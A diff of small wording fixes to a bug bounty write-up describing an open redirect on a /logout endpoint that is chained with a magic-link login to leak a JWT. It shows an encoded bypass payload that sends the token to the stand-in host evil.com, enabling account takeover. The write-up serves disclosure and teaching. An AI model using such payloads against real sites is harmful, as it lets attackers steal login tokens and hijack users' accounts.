@@ -8,7 +8,7 @@ account.
 ## Open Redirection Vulnerability:
 
 - The application had an endpoint like this <span style="color:red"> ***/logout*** </span> that takes a <span style="color:red">***GET***</span> parameter called <span style="color:red">***r***</span>.
-- The parameter <span>***r***</span> takes an endpoint to be redirected to like this <span style="color:red">***/logout?r=/dashboard***</span>.
+- The parameter <span style="color:red">***r***</span> takes an endpoint to be redirected to like this <span style="color:red">***/logout?r=/dashboard***</span>.
 - So I tried to to put a valid host to see what it does like this <span style="color:red">***logout?r=https://program.com/***</span>.
 - The application redirected me so, I new that I can play with it to see what else I can get.
 - I tried to set the host name to another domain like <span style="color:red">***r=https://evil.com/***</span> and the application responded with <span style="color:red">***invalid redirect uri***</span>.
@@ -45,7 +45,7 @@ account.
 - And the magic link sent was like this <span style="color:red">**https://program.com/logout?r=https://evil.com%252f@program.com&jwt=SOME_VALUE**</span>.
 - Clicking the link I was redirected to <span style="color:red">**https://evil.com/?https://evil.com%252f@program.com&jwt=SOME_VALUE**</span>.
 - By this, I was able to get the jwt as an attacker and using the jwt I was able to login.
-- So the same scenario is done if you want to target another user. You need an email after collecting the jwt you can use it to login to the user's account.
+- So the same scenario is done if you want to target another user. You need an email and after collecting the jwt you can use it to login to the user's account.
 
 
 ### My Info :
